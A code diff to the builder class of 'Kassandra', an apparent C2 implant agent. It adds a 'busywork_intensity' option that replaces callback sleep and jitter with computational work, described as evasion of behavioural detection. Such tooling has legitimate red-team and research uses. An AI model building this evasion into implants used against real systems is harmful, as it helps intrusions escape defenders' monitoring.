@@ -71,6 +71,13 @@ class KassandraAgent(PayloadType):
             default_value=False,
             description="Hide console window (sets windows_subsystem = windows for full stealth)",
         ),
+        BuildParameter(
+            name="busywork_intensity",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["low", "medium", "high", "ultra"],
+            default_value="medium",
+            description="BusyWork evasion intensity — replaces sleep with real computational work to break behavioral patterns",
+        ),
     ]                                             # Array if we want custom parameters during build
     agent_path = pathlib.Path(".") / "Kassandra"                           # Path of Kassandra
     agent_icon_path = agent_path / "agent_functions" / "Kassandra.svg"     # Path of the icon
@@ -119,8 +126,6 @@ class KassandraAgent(PayloadType):
                 use_s3 = True
                 params = c2.get_parameters_dict()
                 killdate = params.get("killdate", None)
-                Config["callback_interval"] = params.get("callback_interval", "5")
-                Config["callback_jitter"] = params.get("callback_jitter", "10")
 
                 # Handle AESPSK parameter
                 aespsk_param = params.get("AESPSK", None)
@@ -152,8 +157,6 @@ class KassandraAgent(PayloadType):
             elif profile_name == "tailscale":
                 use_tailscale = True
                 params = c2.get_parameters_dict()
-                Config["callback_interval"] = params.get("callback_interval", "5")
-                Config["callback_jitter"] = params.get("callback_jitter", "10")
 
                 # Handle AESPSK parameter
                 aespsk_param = params.get("AESPSK", None)
@@ -260,8 +263,7 @@ class KassandraAgent(PayloadType):
             content = content.replace("%PORT%", str(Config.get("callback_port", "80")))
             content = content.replace("%USERAGENT%", Config.get("USER_AGENT", ""))
             content = content.replace("%PROXYURL%", Config.get("proxy_host", ""))
-            content = content.replace("%SLEEPTIME%", str(Config.get("callback_interval", "5")))
-            content = content.replace("%JITTER%", str(Config.get("callback_jitter", "10")))
+            content = content.replace("%BUSYWORK_INTENSITY%", self.get_parameter("busywork_intensity"))
             content = content.replace("%CHUNKSIZE%", str(self.get_parameter("chunk_size")))
             content = content.replace("%SSL%", "true" if Config.get("ssl") else "false")
             content = content.replace("%PROXYENABLED%", "true" if Config.get("proxyEnabled") else "false")
